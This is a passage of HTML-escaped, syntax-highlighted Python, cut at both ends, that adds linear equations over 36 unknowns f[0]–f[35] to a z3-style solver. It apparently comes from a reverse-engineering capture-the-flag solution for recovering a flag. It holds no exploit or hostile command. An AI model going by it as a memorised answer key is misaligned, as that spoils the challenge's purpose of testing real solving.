s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23472&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7913&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span 